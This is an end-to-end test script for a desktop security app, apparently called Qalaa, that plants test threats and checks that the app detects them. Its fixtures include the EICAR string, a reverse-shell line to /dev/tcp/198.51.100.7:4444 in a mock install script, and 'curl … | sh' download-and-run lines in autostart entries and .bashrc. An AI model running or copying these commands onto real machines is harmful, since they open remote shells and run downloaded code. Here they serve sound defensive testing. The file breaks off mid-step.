/**
 * End-to-end test of the built desktop app in Electron, against a stand-in
 * Qalaa server. Run under a display (xvfb-run on Linux CI):
 *   npm run build && xvfb-run -a node test/e2e.mjs [screenshot-dir]
 */
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { spawn } from "node:child_process";
import { chmod, copyFile, mkdir, mkdtemp, readFile, readdir, stat, utimes, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { createServer as createTcpServer } from "node:net";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const require = createRequire(import.meta.url);
const { _electron: electron } = require("playwright");
const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const shots = process.argv[2];
const step = (text) => console.log(`✓ ${text}`);
const shot = async (page, name) => {
  if (!shots) return;
  // Let entrance animations settle so the picture shows the finished screen (infinite ones are skipped).
  await page.evaluate(() => Promise.all(document.getAnimations().filter((a) => a.effect?.getTiming().iterations !== Infinity).map((a) => a.finished.catch(() => {}))));
  await page.screenshot({ path: join(shots, `${name}.png`) });
};

const EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const SAMPLE = Buffer.from("this stands in for a sample listed on MalwareBazaar");
const sampleHash = createHash("sha256").update(SAMPLE).digest("hex");

// Stand-in for the account side: queues a full scan and a quarantine once the
// person allows remote scans, and records what the app reports back.
const device = { linked: false, heartbeats: [], queued: [], results: {}, started: [], progress: [], waits: 0, vpnKeys: [] };
const SERVER_WG_KEY = Buffer.alloc(32, 7).toString("base64");
const readBody = (request) =>
  new Promise((resolve) => {
    let data = "";
    request.on("data", (chunk) => (data += chunk));
    request.on("end", () => resolve(data ? JSON.parse(data) : null));
  });
const json = (response, status, body) => {
  response.writeHead(status, { "Content-Type": "application/json" });
  response.end(JSON.stringify(body));
};

const server = createServer(async (request, response) => {
  const url = request.url ?? "";
  // Install scripts for the terminal protection check.
  if (url === "/scripts/pwn.sh") return void response.end('#!/bin/sh\ntouch "$PWNED"\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n');
  if (url === "/scripts/hello.sh") return void response.end("#!/bin/sh\necho hello-from-script\n");
  if (url.startsWith("/api/v1/devices/")) {
    const body = await readBody(request);
    if (url === "/api/v1/devices/register") {
      if (body.link_code !== "ABCD2345") return json(response, 400, { error: { message: "That code is not valid." } });
      device.linked = true;
      return json(response, 201, { device_id: "dev-1", token: "sdv_e2e", account_email: "owner@example.com" });
    }
    if (request.headers.authorization !== "Bearer sdv_e2e") return json(response, 401, { error: { message: "Unknown device" } });
    if (url === "/api/v1/devices/heartbeat") {
      device.heartbeats.push(body);
      if (body.allow_remote && !device.queuedOnce) {
        device.queuedOnce = true;
        device.queued.push({ id: "cmd-scan", kind: "full_scan", args: {} }, { id: "cmd-q", kind: "quarantine", args: { sha256: [sampleHash] } });
      }
      return json(response, 200, { pending_commands: device.queued.length });
    }
    if (url === "/api/v1/devices/commands") return json(response, 200, device.queued.splice(0));
    if (url.startsWith("/api/v1/devices/wait")) {
      device.waits += 1;
      await new Promise((resolve) => setTimeout(resolve, 300));
      return json(response, 200, { pending: device.queued.length > 0 });
    }
    const progress = url.match(/^\/api\/v1\/devices\/commands\/([\w-]+)\/progress$/);
    if (progress) {
      device.progress.push({ id: progress[1], ...body });
      return response.writeHead(204).end();
    }
    if (url === "/api/v1/devices/blocklist") {
      return json(response, 200, { version: "t", generated_at: new Date().toISOString(), hosts: ["evil-history.example"], urls: ["https://shared.example.org/phish/login"], sources: ["test"] });
    }
    if (url === "/api/v1/devices/vpn") {
      device.vpnKeys.push(body.public_key);
      return json(response, 201, {
        peer: { id: "peer-1", name: "PC (desktop app)", address: "10.13.13.5" },
        address: "10.13.13.5/32",
        dns: "10.13.13.1",
        server_public_key: SERVER_WG_KEY,
        endpoint: "vpn.example.org:51820",
        allowed_ips: "0.0.0.0/0, ::/0",
      });
    }
    const started = url.match(/^\/api\/v1\/devices\/commands\/([\w-]+)\/started$/);
    if (started) {
      device.started.push(started[1]);
      return response.writeHead(204).end();
    }
    const result = url.match(/^\/api\/v1\/devices\/commands\/([\w-]+)\/result$/);
    if (result) {
      device.results[result[1]] = body;
      return response.writeHead(204).end();
    }
    if (url === "/api/v1/devices/self") {
      device.linked = false;
      return response.writeHead(204).end();
    }
  }
  if (url === "/api/v1/intelligence/hash-list") {
    response.writeHead(200, { "Content-Type": "application/json" });
    response.end(JSON.stringify({ version: "1-test", generated_at: new Date().toISOString(), sources: ["MalwareBazaar (test)"], sha256: [sampleHash] }));
    return;
  }
  response.writeHead(404).end();
});
await new Promise((resolve) => server.listen(8799, "127.0.0.1", resolve));

const work = await mkdtemp(join(tmpdir(), "qalaa-desktop-e2e-"));
const profile = join(work, "profile");
const downloads = join(work, "Downloads");
const files = join(work, "files");
const documents = join(work, "Documents");
await Promise.all([mkdir(profile), mkdir(downloads), mkdir(files), mkdir(documents)]);
await writeFile(
  join(profile, "settings.json"),
  JSON.stringify({ serverUrl: "http://localhost:8799", watchFolders: [downloads], watchEnabled: true, autoQuarantine: true, useClamav: true, cloudLookup: false, language: "en", ransomwareWatch: true, protectedFolders: [documents] }),
);
const home = join(work, "home");
const exports = join(work, "exports");
await mkdir(exports);
await mkdir(join(home, ".config", "autostart"), { recursive: true });
await writeFile(join(home, ".bashrc"), "export PATH=$PATH:$HOME/bin\n");
await writeFile(join(home, ".config", "autostart", "updater.desktop"), "[Desktop Entry]\nType=Application\nName=System Updater\nExec=sh -c 'curl http://198.51.100.7/u.sh | sh'\n");
// A program reachable from the network on the VNC port, which the security centre should flag.
const vnc = createTcpServer().listen(5900, "0.0.0.0");
// Browser history with one visit to a listed domain and one to a listed exact URL.
const chromeProfile = join(home, ".config", "google-chrome", "Default");
await mkdir(chromeProfile, { recursive: true });
{
  const { DatabaseSync } = await import("node:sqlite");
  const db = new DatabaseSync(join(chromeProfile, "History"));
  db.exec("CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, last_visit_time INTEGER)");
  const now = BigInt(Date.now()) * 1000n + 11_644_473_600_000_000n;
  db.prepare("INSERT INTO urls (url, last_visit_time) VALUES (?, ?), (?, ?), (?, ?)").run(
    "https://login.evil-history.example/account", now,
    "https://shared.example.org/phish/login", now,
    "https://news.example/", now,
  );
  db.close();
}
// A program running from a temporary folder, which the running-programs check flags.
const sleepy = join(work, "sleepy");
// A copy of Node itself (self-contained, unlike coreutils, which some systems ship as one
// multi-call binary) that just waits.
await copyFile(process.execPath, sleepy);
await chmod(sleepy, 0o755);
const sleeper = spawn(sleepy, ["-e", "setTimeout(() => {}, 600000)"], { stdio: "ignore" });
await new Promise((resolve) => setTimeout(resolve, 500));
assert.ok(sleeper.exitCode === null && sleeper.signalCode === null, "the stand-in program from a temporary folder is running");
await writeFile(join(files, "eicar.com"), EICAR);
await writeFile(join(files, "sample.bin"), SAMPLE);
await writeFile(join(files, "notes.txt"), "Shopping list: milk, bread, eggs");
await writeFile(join(files, "invoice.pdf"), Buffer.concat([Buffer.from("MZ"), Buffer.alloc(300)]));

// Removable drives appear as folders here; the app's own temp folder is sandboxed for the junk cleaner.
const drives = join(work, "drives");
const appTemp = join(work, "tmp");
await mkdir(drives);
await mkdir(appTemp);
// A sideloaded browser extension with broad access, for the extension audit.
const fakeExtension = join(home, ".config", "google-chrome", "Default", "Extensions", "abcdefghijklmnopabcdefghijklmnop", "2.1.0_0");
await mkdir(fakeExtension, { recursive: true });
await writeFile(join(fakeExtension, "manifest.json"), JSON.stringify({ name: "Coupon Helper", version: "2.1.0", update_url: "https://198.51.100.7/update.xml", permissions: ["cookies", "webRequest"], host_permissions: ["<all_urls>"] }));
const exists = (path) => stat(path).then(() => true, () => false);
await mkdir(join(home, ".local", "bin"), { recursive: true });

const app = await electron.launch({
  executablePath: require("electron"),
  args: [join(root, "dist", "main.js"), "--no-sandbox"],
  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files, QALAA_EXPORT_DIR: exports, QALAA_TEST_REMOVABLE_ROOT: drives, XDG_CONFIG_HOME: join(home, ".config"), XDG_CACHE_HOME: join(home, ".cache"), XDG_DATA_HOME: join(home, ".local", "share") },
});
app.process().stderr?.on("data", (chunk) => { if (process.env.E2E_DEBUG) process.stderr.write(`[app] ${chunk}`); });
const page = await app.firstWindow();
if (process.env.E2E_DEBUG) page.on("pageerror", (error) => process.stderr.write(`[page] ${error.message}\n`));
await page.waitForSelector("nav button");

// Isolation: the page has no Node.js and only the bridge.
assert.equal(await page.evaluate(() => typeof require), "undefined");
assert.equal(await page.evaluate(() => typeof window.sentinel.scan), "function");
step("window is isolated: no Node.js in the page, only the Qalaa bridge");

await page.click('[data-tab="protection"]');
await page.waitForSelector("text=1 known-malware fingerprints", { timeout: 15000 });
await shot(page, "desktop-protection");
step("fingerprint list downloaded from the server");

await page.click('[data-tab="scan"]');
const totals = await page.evaluate((dir) => window.sentinel.scan([dir]), files);
assert.deepEqual({ ...totals, current: undefined }, { scanned: 4, malicious: 2, suspicious: 1, current: undefined });
await page.waitForSelector('#results li[data-verdict="malicious"]');
const verdicts = await page.$$eval("#results > li", (items) => items.map((li) => `${li.querySelector(".name").textContent}:${li.dataset.verdict}`).sort());
assert.deepEqual(verdicts, ["eicar.com:malicious", "invoice.pdf:suspicious", "notes.txt:no_known_threat", "sample.bin:malicious"]);
await shot(page, "desktop-scan");
step("folder scan: EICAR and known sample malicious, disguised program suspicious, text file no known threat");

await page.locator("#results > li", { hasText: "invoice.pdf" }).locator("button.danger").click();
await page.waitForSelector("text=In quarantine");
await assert.rejects(stat(join(files, "invoice.pdf")));
step("manual quarantine removes the file from its folder");

await writeFile(join(downloads, "free-game.exe.crdownload"), "partial download");
await writeFile(join(downloads, "eicar-download.com"), EICAR);
for (let i = 0; i < 50 && (await readdir(downloads)).includes("eicar-download.com"); i++) await new Promise((r) => setTimeout(r, 200));
assert.deepEqual((await readdir(downloads)).sort(), ["free-game.exe.crdownload"]);
step("new download detected by the watcher and quarantined automatically; partial download ignored");

await page.click('[data-tab="quarantine"]');
await page.waitForSelector("#quarantine li");
assert.equal(await page.locator("#quarantine > li").count(), 2);
await shot(page, "desktop-quarantine");
await page.locator("#quarantine > li", { hasText: "invoice.pdf" }).locator("button.secondary").click();
for (let i = 0; i < 25; i++) {
  if (await stat(join(files, "invoice.pdf")).then(() => true, () => false)) break;
  await new Promise((r) => setTimeout(r, 200));
}
await stat(join(files, "invoice.pdf"));
step("restore puts the file back where it was");

// Ransomware watch: many files renamed with a ransomware extension raise an alert.
for (let i = 0; i < 9; i++) await writeFile(join(documents, `invoice-${i}.docx.lockbit`), Buffer.alloc(2048, i));
await page.waitForSelector("text=Possible ransomware activity", { timeout: 10000 });
await page.waitForSelector("#wifi-status");
await shot(page, "desktop-ransomware");
step("ransomware watch alerts on mass renames with a ransomware extension");

// Decoy files: planted hidden in protected folders; touching one is an immediate alarm.
const decoy = join(documents, ".qalaa-decoy.docx");
assert.ok(await exists(decoy), "a decoy was planted in the protected folder");
assert.ok(await exists(join(documents, ".~qalaa-decoy.xlsx")));
await writeFile(decoy, "ENCRYPTED BY RANSOMWARE");
await page.waitForSelector("text=/hidden decoy file that nothing should touch was changed/", { timeout: 10000 });
step("ransomware decoys: hidden decoy files planted; changing one raises the alarm at once");

// Exclusions: a trusted folder is skipped by scans.
const trusted = join(work, "trusted");
await mkdir(trusted);
await writeFile(join(trusted, "test-virus.com"), EICAR);
await page.click('[data-tab="protection"]');
await page.evaluate(() => document.getElementById("more-protection")?.scrollIntoView());
await app.evaluate(({ dialog }, chosen) => { dialog.showOpenDialog = async () => ({ canceled: false, filePaths: chosen }); }, [trusted]);
await page.click("#exclude-folder");
await page.waitForSelector(`#exclusions >> text="${trusted}"`);
assert.equal((await page.evaluate((p) => window.sentinel.scan([p]), trusted)).scanned, 0);
assert.deepEqual(JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).exclusions, [trusted]);
step("exclusions: a trusted folder chosen in a dialog is skipped by scans");

// Silent mode: on for an hour, then ended.
await page.click('[data-silent="1"]');
await page.waitForSelector("#silent-state >> text=/Silent until/");
await shot(page, "desktop-more-protection");
await page.click("#silent-off");
await page.waitForFunction(() => !/Silent until/.test(document.getElementById("silent-state")?.textContent ?? ""));
step("silent mode: on for a chosen time, then ended");

// Removable drives: a newly connected drive is scanned, including its autorun.inf.
const stick = join(drives, "USB-STICK");
await mkdir(stick);
await writeFile(join(stick, "autorun.inf"), "[autorun]\r\nopen=setup.exe\r\n");
await writeFile(join(stick, "photos.txt"), "holiday list");
let driveResult = null;
for (let i = 0; i < 60 && !driveResult; i++) {
  driveResult = (await page.evaluate(() => window.sentinel.history())).find((r) => r.path === join(stick, "autorun.inf"));
  if (!driveResult) await new Promise((r) => setTimeout(r, 250));
}
assert.ok(driveResult, "the new drive was scanned");
assert.equal(driveResult.verdict, "suspicious");
assert.ok(driveResult.findings.some((f) => f.rule === "autorun_program"));
step("removable drives: a newly connected drive is scanned; an autorun file that starts a program is flagged");

// Account link and a scan started from the website.
await page.click('[data-tab="settings"]');
await page.fill("#link-code", "WRONG123");
await page.click("#link-button");
await page.waitForSelector("text=That code is not valid.");
await page.fill("#link-code", "ABCD2345");
await page.click("#link-button");
await page.waitForSelector("#linked-as");
assert.ok(device.linked);
await page.waitForFunction(() => document.querySelector("#allow-remote") && !document.querySelector("#allow-remote").checked);
assert.ok(device.heartbeats.length >= 1 && device.heartbeats.every((beat) => beat.allow_remote === false));
assert.ok(!JSON.stringify(device.heartbeats).includes(work), "heartbeats must not contain folder paths");
step("linked to an account with a code; remote scans stay off until allowed; no paths sent");

await page.check("#allow-remote");
const deadline = Date.now() + 20000;
while (!device.results["cmd-q"] && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 200));
const scanReport = device.results["cmd-scan"];
assert.ok(scanReport?.ok, `full scan report: ${JSON.stringify(scanReport)}`);
assert.ok(scanReport.scanned >= 2);
assert.ok(scanReport.detections.some((d) => d.name === "sample.bin" && d.sha256 === sampleHash && d.verdict === "malicious"));
assert.ok(!JSON.stringify(scanReport).includes(work), "results must not contain paths");
assert.deepEqual(device.started, ["cmd-scan", "cmd-q"]);
assert.equal(device.results["cmd-q"].quarantined, 1);
await assert.rejects(stat(join(files, "sample.bin")));
await shot(page, "desktop-account");
step("scan started from the account ran here, reported detections, then quarantined the file it found");

assert.ok(device.progress.some((p) => p.id === "cmd-scan" && p.scanned >= 1), `progress reported: ${JSON.stringify(device.progress)}`);
assert.ok(!JSON.stringify(device.progress).includes(work), "progress must not contain paths");
for (let i = 0; i < 50 && device.waits === 0; i++) await new Promise((resolve) => setTimeout(resolve, 200));
assert.ok(device.waits >= 1, "the app keeps a long request open for new commands");
step("live scan progress reported as counts only; long poll for new commands");

// Browsing-history check: list downloaded, history compared on this computer.
await page.click('[data-tab="security"]');
await page.click("#browsing-check");
await page.waitForSelector("#browsing-summary");
const browsing = await page.locator("#browsing").innerText();
assert.match(browsing, /2 visit\(s\) to sites on the danger lists/);
assert.match(browsing, /login\.evil-history\.example/);
assert.match(browsing, /This exact page is listed/);
assert.doesNotMatch(browsing, /news\.example/);
await shot(page, "desktop-browsing");
step("browsing-history check finds a listed domain and a listed exact page; others untouched");

// One-click VPN: keys made here, only the public key sent, tunnel file kept private.
await page.click('[data-tab="protection"]');
await page.click("#vpn-setup");
await page.waitForSelector("#vpn >> text=Show the tunnel file").catch(async () => page.waitForSelector("#vpn-toggle"));
assert.equal(device.vpnKeys.length, 1);
assert.match(device.vpnKeys[0], /^[A-Za-z0-9+/]{43}=$/);
const tunnel = join(profile, "qalaa-vpn.conf");
const tunnelText = await readFile(tunnel, "utf8");
assert.match(tunnelText, /PrivateKey = [A-Za-z0-9+/]{43}=/);
assert.ok(!tunnelText.includes(device.vpnKeys[0]), "the tunnel file holds the private key, the server only got the public one");
assert.match(tunnelText, new RegExp(`PublicKey = ${SERVER_WG_KEY.replace(/[+/]/g, "\\$&")}`));
assert.equal((await stat(tunnel)).mode & 0o777, 0o600);
await shot(page, "desktop-vpn");
step("VPN set up from the app: key pair generated locally, only the public key sent, tunnel file owner-only");
await page.click('[data-tab="settings"]');

page.once("dialog", (dialog) => dialog.accept());
await page.click("#unlink-button");
await page.waitForSelector("#link-code");
assert.equal(device.linked, false);
await assert.rejects(stat(tunnel), "the VPN tunnel is forgotten when the computer is unlinked");
step("removing the computer from the account unlinks it on the server and forgets the VPN tunnel");

// Security centre.
await page.click('[data-tab="security"]');
await page.waitForSelector("#firewall");
await page.waitForSelector("#ports >> text=Port 5900");
assert.match(await page.locator("#ports").innerText(), /VNC/);
const startupText = await page.locator("#startup").innerText();
assert.match(startupText, /System Updater/);
assert.match(startupText, /Downloads and runs a script at every start/);
assert.doesNotMatch(startupText, /New since your last review/, "the first check is the baseline");
await writeFile(join(home, ".config", "autostart", "helper.desktop"), "[Desktop Entry]\nName=Helper\nExec=/tmp/helper --quiet\n");
await page.click("#security-recheck");
await page.waitForSelector("#startup >> text=New since your last review");
await shot(page, "desktop-security");
await page.click("text=Mark all as reviewed");
// Running programs: the copy of sleep in a temporary folder is flagged.
await page.click("#programs-check");
await page.waitForSelector("#programs-summary", { timeout: 120000 });
const programs = await page.locator("#programs").innerText();
assert.match(programs, /sleepy/);
assert.match(programs, /Runs from a temporary folder/);
assert.match(programs, new RegExp(`Process .*${sleeper.pid}`));
assert.match(await page.locator("#encryption").innerText(), /Disk encryption/);
await shot(page, "desktop-programs");
step("running programs checked; one started from a temporary folder is flagged; disk encryption reported");

await page.click("#posture-run");
await page.waitForFunction(() => /^\d+$/.test(document.querySelector("#posture-score")?.textContent ?? ""), null, { timeout: 60000 });
const postureText = await page.locator("#posture").innerText();
assert.match(postureText, /Firewall is on/);
assert.match(postureText, /No world-writable folders in PATH/);
await shot(page, "desktop-posture");
step("security posture: hardening checks scored, each with how to fix it");

await page.waitForSelector("#integrity-ok");
await writeFile(join(home, ".bashrc"), "export PATH=$PATH:$HOME/bin\ncurl http://198.51.100.7/x | sh\n");
await page.click("#integrity-check");
await page.waitForSelector("#integrity-changes >> text=.bashrc");
assert.match(await page.locator("#integrity-changes").innerText(), /Changed/);
await shot(page, "desktop-integrity");
await page.locator("#integrity-changes").getByRole("button", { name: "It was me" }).click();
await page.waitForSelector("#integrity-ok");
step("file integrity: a changed start-up file is detected by its SHA-256 and can be accepted");

await page.click('[data-report="security-html"]');
for (let i = 0; i < 100 && !(await readdir(exports)).some((f) => f.endsWith(".html")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
const htmlReport = (await readdir(exports)).find((f) => f.endsWith(".html"));
const reportText = await readFile(join(exports, htmlReport), "utf8");
assert.match(reportText, /Security audit/);
assert.match(reportText, /Hardening checks/);
assert.doesNotMatch(reportText, /<script/i);
await page.click('[data-report="inventory-pdf"]');
for (let i = 0; i < 150 && !(await readdir(exports)).some((f) => f.endsWith(".pdf")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
const pdf = (await readdir(exports)).find((f) => f.endsWith(".pdf"));
assert.ok(pdf, "a PDF report was written");
assert.equal((await readFile(join(exports, pdf))).subarray(0, 4).toString(), "%PDF");
await page.click('[data-report="performance-csv"]');
for (let i = 0; i < 100 && !(await readdir(exports)).some((f) => f.endsWith(".csv")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
assert.match(await readFile(join(exports, (await readdir(exports)).find((f) => f.endsWith(".csv"))), "utf8"), /Programs using the most memory/);
step("reports: security audit (HTML), hardware inventory (PDF) and performance snapshot (CSV) saved locally");
await page.waitForFunction(() => !document.querySelector("#startup")?.textContent?.includes("New since your last review"));
step("security centre: risky open port, startup entry running a downloaded script, new startup item since last review");

// System monitor: live readings, connections with their programs, services, log.
await page.click('[data-tab="monitor"]');
await page.waitForFunction(() => /\d+%/.test(document.querySelector("#monitor-cpu .big")?.textContent ?? ""));
await page.waitForFunction(() => /\d/.test(document.querySelector("#monitor-memory .big")?.textContent ?? ""), null, { timeout: 15000 });
await page.click('[data-pane="connections"]');
await page.waitForSelector("#monitor-external");
await page.uncheck("#monitor-external");
await page.fill("#monitor-filter", "5900");
await page.waitForFunction(() => /LISTEN/.test(document.querySelector("#monitor-pane table")?.textContent ?? ""));
assert.match(await page.locator("#monitor-pane table").innerText(), /node/i, "the listening port is attributed to its program");
assert.equal(await page.evaluate(() => document.activeElement?.id), "monitor-filter", "typing in the filter keeps focus");
await shot(page, "desktop-monitor");
await page.click('[data-pane="services"]');
await page.waitForFunction(() => /Background services/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
await page.click('[data-pane="events"]');
await page.waitForFunction(() => /system log/i.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
step("system monitor: live CPU and memory, connections with their programs, services and system log");

// Process explorer: tree, inspect (hash + signature), suspend, resume, end.
await page.click('[data-pane="processes"]');
await page.waitForSelector("#monitor-pane table");
await page.fill("#monitor-filter", "sleepy");
await page.waitForFunction(() => /sleepy/.test(document.querySelector("#monitor-pane table")?.textContent ?? ""));
const sleepyRow = page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first();
await sleepyRow.getByRole("button", { name: "Inspect" }).click();
await page.waitForFunction(() => /[0-9a-f]{64}/.test(document.querySelector("#monitor-pane tr.detail")?.textContent ?? ""));
const detail = await page.locator("#monitor-pane tr.detail").innerText();
assert.match(detail, /Not signed|Installed by/);
assert.match(detail, /setTimeout/);
page.once("dialog", (d) => d.accept());
await sleepyRow.getByRole("button", { name: "Suspend", exact: true }).click();
await page.waitForFunction(() => document.querySelector("#monitor-pane tr.flag") !== null);
const stopped = (await readFile(`/proc/${sleeper.pid}/stat`, "utf8")).split(") ")[1]?.[0];
assert.equal(stopped, "T", "the process is stopped");
await page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first().getByRole("button", { name: "Resume", exact: true }).click();
await page.waitForFunction(() => document.querySelector("#monitor-pane tr.flag") === null);
await shot(page, "desktop-processes");
page.once("dialog", (d) => d.accept());
await page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first().getByRole("button", { name: "End", exact: true }).click();
for (let i = 0; i < 40 && sleeper.exitCode === null && sleeper.signalCode === null; i++) await new Promise((resolve) => setTimeout(resolve, 100));
assert.ok(sleeper.exitCode !== null || sleeper.signalCode !== null, "the process was ended");
step("process explorer: tree with threads and memory, SHA-256 and signature, suspend, resume and end");

await page.click('[data-pane="storage"]');
await page.waitForFunction(() => /Volumes/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
await page.click('[data-pane="network"]');
await page.fill("#dns-query", "127.0.0.1");
await page.click("#dns-go");
await page.waitForSelector("#dns-result >> text=This computer");
assert.match(await page.locator("#monitor-pane").innerText(), /Network interfaces/);
await page.click('[data-pane="history"]');
await page.waitForFunction(() => /7 days/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
assert.match(await page.locator("#monitor-pane").innerText(), /Security activity/);
await page.click('[data-pane="events"]');
await page.selectOption("#event-source", "security");
await page.waitForFunction(() => /Sign-ins, failed passwords/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
step("storage inspector, DNS lookup with address classification, interface counters, local history, security log");
await page.click('[data-tab="security"]');

// Scheduled scan settings save.
await page.selectOption("#scan-frequency", "daily");
await page.selectOption("#scan-hour", "3");
await page.waitForSelector("#schedule >> text=Next run");
const savedSchedule = JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).scanSchedule;
assert.deepEqual(savedSchedule, { frequency: "daily", day: 0, hour: 3 });
step("scheduled scan saved");

// Encrypted backup, check and restore. System dialogs are answered by the test.
const answerDialog = (paths) => app.evaluate(({ dialog }, chosen) => { dialog.showOpenDialog = async () => ({ canceled: false, filePaths: chosen }); }, paths);
const usb = join(work, "usb");
await mkdir(usb);
await writeFile(join(documents, "family-photo.jpg"), Buffer.alloc(300_000, 7));
await answerDialog([documents]);
await page.click("#backup-add-folder");
await page.locator("#backup-folders li", { hasText: documents }).waitFor();
await answerDialog([usb]);
await page.click("text=Choose…");
await page.locator("#backup-destination", { hasText: usb }).waitFor();
await page.fill("#backup-password", "short");
await page.click("#backup-save-password");
await page.waitForSelector("text=at least 10 characters");
await page.fill("#backup-password", "family photos 2026!");
await page.click("#backup-save-password");
await page.waitForSelector("text=A password is set.");
await page.click("#backup-now");
await page.waitForSelector("text=Backup finished", { timeout: 30000 });
const archives = (await readdir(usb)).filter((name) => name.endsWith(".sbk"));
assert.equal(archives.length, 1);
assert.ok(!(await readFile(join(usb, archives[0]))).includes(Buffer.from("family-photo")), "names are encrypted too");
await page.click("text=Check or restore a backup");
await page.fill("#open-password", "wrong password here");
await answerDialog([join(usb, archives[0])]);
await page.click("text=Check a backup file");
await page.waitForSelector("text=Wrong password");
await page.fill("#open-password", "family photos 2026!");
await page.click("text=Check a backup file");
await page.waitForSelector("text=The backup is intact");
const restoreInto = join(work, "restored");
await app.evaluate(({ dialog, shell }, [file, target]) => {
  let call = 0;
  dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [call++ === 0 ? file : target] });
  shell.openPath = async () => "";
}, [join(usb, archives[0]), restoreInto]);
await page.click("text=Restore a backup file");
await page.waitForSelector("text=Restored");
assert.deepEqual(await readFile(join(restoreInto, "Documents", "family-photo.jpg")), await readFile(join(documents, "family-photo.jpg")));
await shot(page, "desktop-backup");
step("encrypted backup: weak password refused, wrong password detected, check and restore give back identical files");

await page.click('[data-tab="settings"]');
const canvas = () => page.evaluate(() => getComputedStyle(document.body).backgroundColor);
// Playwright pins pages to a light colour scheme; let the app's own setting decide.
await page.emulateMedia({ colorScheme: null });
await page.selectOption("#theme", "dark");
await page.waitForFunction(() => matchMedia("(prefers-color-scheme: dark)").matches);
assert.equal(await canvas(), "rgb(7, 11, 22)");
await page.click('[data-tab="scan"]');
await shot(page, "desktop-dark");
await page.click('[data-tab="settings"]');
await page.selectOption("#theme", "light");
await page.waitForFunction(() => !matchMedia("(prefers-color-scheme: dark)").matches);
assert.equal(await canvas(), "rgb(247, 244, 238)");
assert.equal(JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).theme, "light");
step("appearance: dark and light themes chosen in Settings, saved");

// System watch (Linux): a program dropped into ~/.local/bin is scanned and quarantined; a new autostart entry is reported.
const dropped = join(home, ".local", "bin", "sysupdate");
await writeFile(dropped, EICAR, { mode: 0o755 });
for (let i = 0; i < 40 && (await exists(dropped)); i++) await new Promise((r) => setTimeout(r, 250));
assert.equal(await exists(dropped), false, "the dropped program was quarantined");
await writeFile(join(home, ".config", "autostart", "miner.desktop"), "[Desktop Entry]\nType=Application\nName=Miner\nExec=sh -c 'curl http://198.51.100.7/m | sh'\n");
let startupLogged = false;
for (let i = 0; i < 40 && !startupLogged; i++) {
  startupLogged = (await page.evaluate(() => window.sentinel.securityLog())).some((e) => /New startup entry: Miner/.test(e.message));
  if (!startupLogged) await new Promise((r) => setTimeout(r, 250));
}
assert.ok(startupLogged, "the new startup entry was reported");
step("system watch: a program dropped in ~/.local/bin is quarantined; a new autostart entry is reported at once");

// Terminal protection: turned on from the app, then real bash and zsh sessions are driven through a terminal.
await writeFile(join(home, ".zshrc"), "# zsh user\n");
await page.click('[data-tab="protection"]');
await page.waitForSelector("#terminal-on");
await page.click("#terminal-on");
await page.waitForSelector("#terminal-state >> text=/On for bash, zsh/");
assert.match(await readFile(join(home, ".bashrc"), "utf8"), /Qalaa terminal protection/);
assert.match(await readFile(join(home, ".local", "bin", "qalaa"), "utf8"), /ELECTRON_RUN_AS_NODE=1/);
await new Promise((r) => setTimeout(r, 1500));
const integrityAfterTerminal = await page.evaluate(() => window.sentinel.integrityState());
assert.equal(integrityAfterTerminal.changes.length, 0, "Qalaa's own edit to .bashrc raised no integrity alarm");
// The file-integrity step above left a test line in .bashrc that would run at every shell start.
await writeFile(join(home, ".bashrc"), (await readFile(join(home, ".bashrc"), "utf8")).replace(/^curl .*\n/m, ""));
// Asynchronous: the mock server answering qalaa's script downloads runs in this same process.
const { execFile } = await import("node:child_process");
const shells = await new Promise((resolve, reject) =>
  execFile("python3", [join(root, "test", "terminal-shells.py"), home, "http://127.0.0.1:8799/scripts", work], { env: { ...process.env, QALAA_DATA_DIR: profile }, encoding: "utf8", timeout: 180_000 }, (error, stdout, stderr) =>
    error ? reject(new Error(`${error.message}\n${stdout}\n${stderr}`)) : resolve(stdout),
  ),
);
assert.match(shells, /All terminal protection checks passed/);
for (const line of shells.trim().split("\n").filter((l) => l.startsWith("✓"))) step(`terminal protection, ${line.slice(2)}`);
await page.click("#terminal-off");
await page.waitForSelector("#terminal-state >> text=Off.");
assert.doesNotMatch(await readFile(join(home, ".bashrc"), "utf8"), /Qalaa terminal protection/);
step("terminal protection turned off again; .bashrc restored");

// Tools: startup manager, deep check, extensions, junk cleanup, shredder, firewall.
await page.click('[data-tab="tools"]');
await page.waitForSelector("#startup-manager");
const updaterFile = join(home, ".config", "autostart", "updater.desktop");
await page.locator("#startup-manager li", { hasText: "System Updater" }).getByRole("button", { name: "Switch off" }).click();
await page.waitForSelector("#startup-disabled >> text=System Updater");
assert.match(await readFile(updaterFile, "utf8"), /Hidden=true/);
await page.locator("#startup-disabled li", { hasText: "System Updater" }).getByRole("button", { name: "Switch back on" }).click();
await page.waitForFunction(() => !document.getElementById("startup-disabled"));
assert.doesNotMatch(await readFile(updaterFile, "utf8"), /Hidden=true/);
step("startup manager: a program is switched off at startup and back on");

await page.click("#deep-run");
await page.waitForSelector("#deep-summary", { timeout: 120000 });
assert.match(await page.locator("#deep-summary").innerText(), /Hidden processes/);
step("deep check: cron, services, preloaded libraries, hidden processes and kernel modules checked");

await page.click("#extensions-check");
